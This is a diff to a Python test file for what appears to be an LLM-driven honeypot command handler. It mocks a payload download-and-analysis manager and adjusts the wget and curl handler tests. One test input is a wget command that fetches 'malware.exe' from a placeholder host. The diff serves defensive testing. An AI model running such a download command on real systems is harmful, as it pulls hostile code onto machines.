@@ -14,7 +14,11 @@ def handler():
     mock_llm = MagicMock()
     mock_db = MagicMock()
     mock_db.get_cached_response.return_value = None
-    return CommandHandler(mock_llm, mock_db)
+    h = CommandHandler(mock_llm, mock_db)
+    # Mock payload manager to avoid real downloads interfering with tests
+    h.payload_manager = MagicMock()
+    h.payload_manager.download_and_analyze_sync.return_value = None
+    return h
 
 
 class TestNetworkPagers:
@@ -23,7 +27,7 @@ class TestNetworkPagers:
         # Mock LLM
         handler.llm.generate_content.return_value = "<html>Malware</html>"
 
-        resp, _ = handler.handle_wget(
+        resp, _, _ = handler.handle_wget(
             "wget -O malware.exe http://example.com/malware.exe",
             {"session_id": "1", "cwd": "/root"},
         )
@@ -37,7 +41,7 @@ class TestNetworkPagers:
         start = time.time()
         handler.llm.generate_content.return_value = "<html>Malware</html>"
 
-        resp, _ = handler.handle_curl(
+        resp, _, _ = handler.handle_curl(
             "curl http://example.com", {"session_id": "1", "cwd": "/root"}
         )
         end = time.time()
